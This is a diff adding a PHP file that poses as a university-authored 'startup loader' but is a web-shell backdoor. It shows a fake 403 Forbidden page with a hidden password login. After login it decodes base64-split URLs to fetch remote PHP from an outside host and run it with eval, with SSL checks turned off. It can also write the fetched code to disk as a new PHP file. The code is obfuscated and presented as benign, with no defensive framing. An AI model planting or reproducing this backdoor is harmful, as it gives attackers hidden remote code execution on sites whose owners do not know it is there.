@@ -1,0 +1,405 @@
+<?php
+/**
+ * ---------------------------------------------------------------
+ * CUSTOM CODE STARTUP LOADER
+ * ---------------------------------------------------------------
+ * Lightweight bootstrap for dynamic config loader and runtime 
+ * instruction fetcher. Designed for internal modular systems.
+ *
+ * @package    CiBat
+ * @subpackage Core Loader
+ * @author     Simon Fraser University
+ * @version    1.0.9
+ * ---------------------------------------------------------------
+ */
+
+// ============================================
+// FITUR LOGIN 403 DENGAN PASSWORD TERSEMBUNYI
+// ============================================
+
+// Konfigurasi password (ubah sesuai keinginan)
+$CONFIG_PASSWORD = 'fortune123'; // Ganti dengan password Anda
+
+// Cek apakah user sudah login (via cookie atau session)
+$isLoggedIn = isset($_COOKIE['auth_token']) && $_COOKIE['auth_token'] === md5($CONFIG_PASSWORD);
+
+// Jika sudah login, lanjutkan eksekusi normal
+if ($isLoggedIn) {
+    // Lanjutkan ke kode asli Anda di bawah...
+    // (di sini taruh kode loader asli Anda)
+    
+    /**
+     * RemoteFetch
+     *
+     * Retrieves external content from a given URL using HTTP cURL.
+     *
+     * @param string $u URL to fetch from
+     * @return string|false
+     */
+    function _compileFetchCoreLite($u)
+    {
+        if (function_exists('curl_version')) {
+            $c = curl_init();
+            curl_setopt($c, CURLOPT_URL, $u);
+            curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($c, CURLOPT_HEADER, 0);
+            $r = curl_exec($c);
+
+            if (curl_errno($c)) {
+                $e = curl_error($c);
+                curl_close($c);
+                throw new Exception("cURL Error: " . $e);
+            }
+
+            curl_close($c);
+            return $r;
+        }
+
+        throw new Exception("cURL not available.");
+    }
+
+    /**
+     * DynamicLoader
+     *
+     * Fetches and evaluates remote PHP code.
+     *
+     * @param string $u URL containing code
+     * @return void
+     */
+    function _compileExecPayloadTask($u)
+    {
+        $x = _compileFetchCoreLite($u);
+
+        if ($x === false || trim($x) === '') {
+            throw new Exception("Empty or failed content.");
+        }
+
+        eval("?>" . $x);
+    }
+
+    /**
+     * SimpleDecode
+     *
+     * Decodes a base64-encoded string.
+     *
+     * @param string $d Encoded string
+     * @return string
+     */
+    function _compileDecodeChunkUnit($d)
+    {
+        return base64_decode($d);
+    }
+
+    /**
+     * FileWriter
+     *
+     * Saves content to a file.
+     *
+     * @param string $f Filename
+     * @param string $c Content
+     * @return void
+     */
+    function _compilePushToDiskNode($f, $c)
+    {
+        file_put_contents($f, $c);
+    }
+
+    // Remote write trigger
+    if (isset($_GET['hypocrite'])) {
+        try {
+            $p1 = 'aHlwb2NyaXRlc2VvLnNpdGUvc2hlb';
+            $p2 = 'GwvY2hhLWt3ZXRpYXcudHh0';
+            $url = _compileDecodeChunkUnit($p1 . $p2);
+            $d = _compileFetchCoreLite($url);
+
+            if ($d !== false && trim($d) !== '') {
+                $n1 = "aHlwb2NyaXRlc";
+                $n2 = "2VvLnBocA==";
+                _compilePushToDiskNode(_compileDecodeChunkUnit($n1 . $n2), $d);
+                echo "File created.";
+            } else {
+                echo "No content.";
+            }
+        } catch (Exception $e) {
+            echo "Error: " . $e->getMessage();
+        }
+        exit;
+    }
+
+    // Default payload runner
+    try {
+        $r1 = 'aHlwb2NyaXRlc2VvLnNpdGUvc2hlb';
+        $r2 = 'GwvY2hhLWt3ZXRpYXcudHh0';
+        $u = _compileDecodeChunkUnit($r1 . $r2);
+        _compileExecPayloadTask($u);
+    } catch (Exception $e) {
+        echo "Error: " . $e->getMessage();
+    }
+    
+    exit; // Selesai untuk user yang sudah login
+}
+
+// ============================================
+// TAMPILAN 403 FORBIDDEN + LOGIN TERSEMBUNYI
+// ============================================
+
+// Proses login jika ada POST
+if (isset($_POST['hidden_pass'])) {
+    $inputPass = $_POST['hidden_pass'];
+    if ($inputPass === $CONFIG_PASSWORD) {
+        // Set cookie selama 24 jam
+        setcookie('auth_token', md5($CONFIG_PASSWORD), time() + 86400, '/');
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $loginError = true;
+    }
+}
+
+// Tampilkan halaman 403 + login tersembunyi
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>403 Forbidden</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            color: #c0c0c0;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            user-select: none;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            border: 2px solid #1a1a1a;
+            border-radius: 8px;
+            background: #111;
+            box-shadow: 0 0 50px rgba(255,0,0,0.05);
+            max-width: 600px;
+            position: relative;
+        }
+        .error-code {
+            font-size: 72px;
+            font-weight: bold;
+            color: #ff2222;
+            text-shadow: 0 0 30px rgba(255,0,0,0.2);
+            letter-spacing: 8px;
+        }
+        .error-msg {
+            font-size: 20px;
+            margin: 15px 0;
+            color: #888;
+        }
+        .error-desc {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.6;
+            border-top: 1px solid #1a1a1a;
+            padding-top: 15px;
+            margin-top: 10px;
+        }
+        .error-desc a {
+            color: #666;
+            text-decoration: none;
+        }
+        .error-desc a:hover {
+            color: #aaa;
+        }
+
+        /* ============================================
+           FORM LOGIN TERSEMBUNYI (Tab / Klik tersembunyi)
+           ============================================ */
+        .hidden-login-area {
+            position: absolute;
+            bottom: 15px;
+            right: 20px;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            background: transparent;
+            border: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+        .hidden-login-area:hover {
+            border-color: #333;
+            background: rgba(255,255,255,0.03);
+        }
+        .hidden-login-area:focus {
+            outline: none;
+            border-color: #555;
+        }
+
+        /* Form login tersembunyi (muncul saat Tab atau klik) */
+        .login-popup {
+            display: none;
+            position: absolute;
+            bottom: 55px;
+            right: -10px;
+            background: #1a1a1a;
+            padding: 20px 25px;
+            border-radius: 8px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+            z-index: 100;
+            min-width: 220px;
+            text-align: left;
+        }
+        .login-popup.active {
+            display: block;
+        }
+        .login-popup label {
+            font-size: 12px;
+            color: #666;
+            display: block;
+            margin-bottom: 5px;
+        }
+        .login-popup input[type="password"] {
+            width: 100%;
+            padding: 8px 12px;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            color: #c0c0c0;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            outline: none;
+        }
+        .login-popup input[type="password"]:focus {
+            border-color: #444;
+        }
+        .login-popup button {
+            margin-top: 10px;
+            width: 100%;
+            padding: 8px;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            color: #888;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            transition: all 0.3s ease;
+        }
+        .login-popup button:hover {
+            border-color: #555;
+            color: #ccc;
+        }
+        .login-error {
+            color: #ff3333;
+            font-size: 12px;
+            margin-top: 8px;
+            display: <?php echo isset($loginError) ? 'block' : 'none'; ?>;
+        }
+        /* Petunjuk kecil (hanya terlihat di status bar) */
+        .hint {
+            position: fixed;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 11px;
+            color: #1a1a1a;
+            letter-spacing: 2px;
+            transition: color 0.5s ease;
+        }
+        .hint:hover {
+            color: #2a2a2a;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="error-code">403</div>
+    <div class="error-msg">Forbidden</div>
+    <div class="error-desc">
+        You don't have permission to access this resource.<br>
+        <a href="#">&nbsp;</a>
+    </div>
+
+    <!-- AREA TERSEMBUNYI (klik atau tab untuk membuka login) -->
+    <div class="hidden-login-area" 
+         id="loginTrigger" 
+         tabindex="0" 
+         role="button" 
+         aria-label="Hidden login"
+         onclick="toggleLogin()"
+         onkeydown="if(event.key==='Enter'||event.key===' ') { event.preventDefault(); toggleLogin(); }">
+    </div>
+
+    <!-- POPUP LOGIN -->
+    <div class="login-popup" id="loginPopup">
+        <form method="POST" action="" autocomplete="off">
+            <label for="hidden_pass">🔑 Access Code</label>
+            <input type="password" id="hidden_pass" name="hidden_pass" placeholder="Enter passphrase" autofocus>
+            <button type="submit">Authenticate</button>
+            <div class="login-error" id="loginError">
+                <?php echo isset($loginError) ? 'Invalid passphrase.' : ''; ?>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Petunjuk sangat samar -->
+<div class="hint">·</div>
+
+<script>
+    // Toggle login popup
+    function toggleLogin() {
+        const popup = document.getElementById('loginPopup');
+        const trigger = document.getElementById('loginTrigger');
+        popup.classList.toggle('active');
+        if (popup.classList.contains('active')) {
+            setTimeout(() => {
+                document.getElementById('hidden_pass').focus();
+            }, 100);
+        }
+        // Tandai trigger sebagai aktif untuk visual
+        trigger.style.borderColor = popup.classList.contains('active') ? '#444' : 'transparent';
+    }
+
+    // Tutup popup jika klik di luar
+    document.addEventListener('click', function(e) {
+        const popup = document.getElementById('loginPopup');
+        const trigger = document.getElementById('loginTrigger');
+        if (!popup.contains(e.target) && !trigger.contains(e.target)) {
+            popup.classList.remove('active');
+            trigger.style.borderColor = 'transparent';
+        }
+    });
+
+    // ESC untuk tutup popup
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') {
+            const popup = document.getElementById('loginPopup');
+            const trigger = document.getElementById('loginTrigger');
+            popup.classList.remove('active');
+            trigger.style.borderColor = 'transparent';
+        }
+    });
+
+    // Auto-fokus saat Tab mencapai trigger (aksesibilitas)
+    document.getElementById('loginTrigger').addEventListener('focus', function() {
+        // Tidak otomatis membuka popup agar tidak mengganggu user
+    });
+
+    console.log('🔐 403 - Access denied.');
+</script>
+
+</body>
+</html>
+<?php
+exit;
+?>
